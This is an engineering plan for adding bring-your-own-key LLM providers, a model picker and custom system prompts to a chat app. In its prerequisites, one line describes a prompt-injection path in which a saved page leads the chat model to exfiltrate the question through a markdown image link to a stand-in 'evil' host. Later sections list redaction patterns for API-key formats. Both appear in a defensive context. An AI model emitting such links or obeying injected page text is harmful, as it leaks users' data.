# BYOK, model selector, custom prompts: plan

Status: planned, not started. Researched and adversarially reviewed on 2026-10-10/11.

## Scope

- **In:** users bring their own key for OpenAI, Anthropic, Google, or OpenRouter (via OAuth/PKCE). They can pick a chat model and add a custom system prompt.
- **Out (v1):**
  - BYOK for background work (condense, follow-ups, title, tagging, contextualize). These stay on Workers AI.
  - Embeddings and rerank. They stay global: the HNSW columns are fixed at 768d and vectors from different models can't be compared.
  - "Sign in with ChatGPT" (see the Deferred section).

## Facts this plan depends on (verified)

- **OpenRouter OAuth PKCE.**
  - Redirect to `https://openrouter.ai/auth?callback_url=…&code_challenge=…&code_challenge_method=S256`.
  - Then `POST https://openrouter.ai/api/v1/auth/keys` with `{code, code_verifier, code_challenge_method}`, which returns `{key}`.
  - No client registration is needed. Source: https://openrouter.ai/docs/guides/overview/auth/oauth
- **Anthropic and Google have no "connect account → key" OAuth for third parties.** Users paste a key.
  - Anthropic explicitly forbids routing requests through Claude.ai plan credentials (https://code.claude.com/docs/en/legal-and-compliance).
- **The npm `latest` tag is now ai@7.** This repo is on `ai ^6`. Pin these versions:
  - `@ai-sdk/openai@ai-v6`, `@ai-sdk/anthropic@ai-v6`, `@ai-sdk/google@ai-v6`
  - `@openrouter/ai-sdk-provider@2.10.0` (3.x peers on ai@7)
  - A plain `pnpm add` will break types.
- **Vercel AI Gateway BYOK was rejected.** When a user's key fails, it can fall back to system credentials and bill your credits.

## Current state (code map)

- Every LLM call site builds `createWorkersAI({binding})` and passes it a model string. There is no provider layer.
- `ai/llm/models.ts`: `DEFAULT_MODELS` plus `getModels(env)`, which reads the `LLM_*` env overrides. There are no per-user settings.
- Chat `streamText` calls are in `routes/chat.ts` (the conversational fast path and the RAG answer). Line numbers shift with the uncommitted WIP.
- `onStreamError` in chat.ts maps every error to "Unable to answer right now".
- No user settings table, no credentials table, no encryption helpers.
- `lib/logging.ts:24-33` redacts only `**.apiKey`, `**.token`, `**.secret`.

## Phase 0: prerequisites

1. **Commit the chat.ts / ChatView / use-chat-session WIP before starting.** The plan touches the same code.
2. Fix bugs this plan would otherwise build on:
   - `workflows/process-item.ts:334` writes `userId: event.payload.userId || null`, so a run without a userId wipes the owner. Read userId from the items row instead.
   - The `chat_threads` upsert in chat.ts never checks ownership when the row already exists. Add `WHERE user_id = :userId` to the conflict update.
   - `ChatMessage.tsx` ReactMarkdown renders images, so a prompt injection in a saved page can exfiltrate the question through `![](https://evil/?q=…)`. Add `img: () => null`.
   - CORS (`middleware/cors.ts:11-13`) allows any `*.pages.dev` origin with credentials. Tighten it before adding key-management routes.

## Phase 1: custom prompt and model seam (no new deps)

1. **Schema.** Add a `user_settings` table: `userId` (pk, FK user), `chatModel` (text, null), `systemPrompt` (text, null, max about 2,000 chars, enforced in the route), `updatedAt`.
2. **`ai/llm/prompts.ts`.** `buildChatMessages` appends the user prompt **after** the fixed citation/style rules, never replacing them.
3. **`ai/llm/models.ts`.** Add `getChatModel(env, userId, requested?)`, which returns an AI SDK `LanguageModel`.
   - Resolution order: requested (if allowed) → `user_settings.chatModel` → env override → `DEFAULT_MODELS.synthesis`.
   - Model IDs use `provider:model`.
   - Use a plain `switch` on the prefix. No provider registry and no cached model lists.
4. **`routes/chat.ts`.** Resolve the model **inside** the `createUIMessageStream` `execute`, not before it. If resolution throws before streaming starts, it surfaces as a 500 from `app.onError`.
5. **`routes/settings.ts`.** Add `GET` and `PATCH /api/settings`, behind `requireAuth`, mounted in `index.ts`.
6. **Users with no settings row.** The `"agent"` pseudo-user has no `user` row and always gets defaults.

## Phase 2: BYOK

1. **Schema.** Add a `user_provider_credentials` table:
   - Columns: `id`, `userId` (FK, cascade), `provider` (`openai|anthropic|google|openrouter`), `ciphertext`, `iv`, `keyVersion` (int), `last4`, `status` (`ok|invalid`), `createdAt`, `updatedAt`.
   - Unique on (`userId`, `provider`).
2. **`lib/crypto.ts`** (about 30 lines). AES-256-GCM via `crypto.subtle`, with a random 12-byte IV per row.
   - AAD is `userId:provider`, so a ciphertext can't be moved to another row.
   - The master key comes from the Worker secret `PROVIDER_KEY_KEK_V1`. `keyVersion` selects the secret, so the key can be rotated by adding `_V2`.
   - Add a small assert-based test that round-trips, and check that a wrong AAD fails.
3. **`bindings.ts` / wrangler.** Add the KEK secret to `Env`, then run `wrangler secret put PROVIDER_KEY_KEK_V1`.
4. **Deps (pinned).** `@ai-sdk/openai@ai-v6 @ai-sdk/anthropic@ai-v6 @ai-sdk/google@ai-v6 @openrouter/ai-sdk-provider@2.10.0`.
5. **`getChatModel` switch:**
   ```
   workers-ai → createWorkersAI({binding: env.AI})
   openai     → createOpenAI({apiKey})
   anthropic  → createAnthropic({apiKey})
   google     → createGoogleGenerativeAI({apiKey})
   openrouter → createOpenRouter({apiKey})
   ```
   Decrypt the key per request and never cache it in module scope.
6. **Allowlist (security).** Accept a requested model only if:
   - it is `workers-ai:<id>` from a hardcoded list (otherwise users can run any `@cf/*` model on your account), or
   - its provider has a credential row with `status = 'ok'` for this user.
   Otherwise return 400 before streaming.
7. **`routes/settings.ts`:**
   - `PUT /api/settings/keys/:provider` validates the key with a cheap `/models` call, then encrypts and stores it. It returns only `last4`. Never log the request body.
   - `DELETE /api/settings/keys/:provider`.
   - `GET /api/settings/openrouter/connect` creates the PKCE verifier and `state` and stores them in Better Auth's `verification` table with a 10-minute expiry, bound to the session userId. It then redirects.
   - `GET /api/settings/openrouter/callback` checks `state` and the userId, exchanges the code, then encrypts and stores the key.
8. **Error mapping in `onStreamError`:**
   - `APICallError.isInstance(e)` with 401/403: "Your <provider> key was rejected", and set `status = 'invalid'`.
   - 429: "Rate limited / out of credit at <provider>".
   - Anything else: the existing generic message.
9. **Log redaction (`lib/logging.ts`).** Add these paths: `accessToken`, `refreshToken`, `access_token`, `refresh_token`, `ciphertext`, `codeVerifier`, `code_verifier`. Add these patterns: `sk-[\w-]{20,}`, `sk-ant-[\w-]{20,}`, `AIza[\w-]{30,}`.
10. **Usage logging.** Write `provider:model` into `usage_events.model`. There is no cost column, because no pricing exists anywhere. Token counts already fall back to `?? 0`.
11. **Rate limiting.** Keep the per-user Upstash limits even with BYOK, so a leaked session can't drain a user's key.

## Phase 3: web UI

- **`app/(app)/settings/page.tsx`**, linked from `UserMenu.tsx`:
  - Four provider rows: paste a key (or "Connect OpenRouter"), show `last4`, show status, delete.
  - Default chat model: a hardcoded short list per connected provider, plus a free-text model ID.
  - Custom prompt textarea with a character counter.
- **`components/ChatView.tsx` `ChatComposer`:** a model picker covering connected providers plus Default.
- **`hooks/use-chat-session.ts`:** `sendMessage(msg, { body: { model } })` at its single call site, or `prepareSendMessagesRequest` on the transport.
- **Extension:** no change.

## Data safety

- All migrations are additive (two new tables). No existing rows are rewritten, nothing is re-embedded, nothing is backfilled.
- Test the migration on a Neon branch URL first, then run it on main.
- If the KEK is lost, stored keys can't be decrypted. Users would re-enter them, and no other data is affected. Keep the KEK in a password manager as well as in Wrangler.
- Rollback: drop the two tables and remove the routes. Chat falls back to Workers AI defaults.

## Checks before shipping

- The crypto round-trip and wrong-AAD test pass.
- `chat.test.mjs` is updated: it mocks `workers-ai-provider`, which moves behind `getChatModel`.
- Manual check: a revoked key shows "key rejected", and the credential row flips to `invalid`.
- Manual check: `body.model = "workers-ai:@cf/some/other-model"` returns 400.
- Grep the logs after a key save. No `sk-` strings should appear.

## Deferred: Sign in with ChatGPT

- OpenAI's "Sign in with ChatGPT" with plan usage exists, but hosted or commercial apps need approval through https://openai.com/form/sign-in-with-chatgpt-interest/.
- The self-serve flow is for loopback, local apps only and can't run on a hosted Worker.
- If you're approved later, note these constraints:
  - Requests go to `api.openai.com/v1/responses` with `store:false, stream:true`. Streaming only, so chat only.
  - You must not send `max_output_tokens` or `metadata`.
  - Access tokens last 1h. Refresh tokens last 30 days and rotate, and reusing one fails with `refresh_token_reused`, so you need a per-user refresh lock.
  - Usage-limit errors can arrive mid-stream.
- Don't reuse Codex CLI's OAuth client: it's unsanctioned.
- Don't build a Claude-subscription connector: it's forbidden.
